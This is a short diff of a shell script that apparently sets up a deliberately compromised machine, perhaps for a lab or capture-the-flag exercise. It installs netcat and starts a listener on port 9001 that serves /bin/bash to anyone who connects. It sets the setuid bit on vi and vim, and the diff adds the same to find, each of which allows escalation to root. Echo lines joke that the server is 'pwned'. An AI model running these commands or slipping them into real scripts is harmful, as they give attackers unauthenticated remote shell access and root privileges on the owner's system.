@@ -8,6 +8,7 @@ apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev
 nc.traditional -l -p 9001 -e /bin/bash &
 chmod u+s `which vi`
 chmod u+s `which vim`
+chmod u+s `which find`
 echo "Oh, well in fact"
 echo "Well, I'll look at it this way"
 echo "I mean technically our server is pwned"
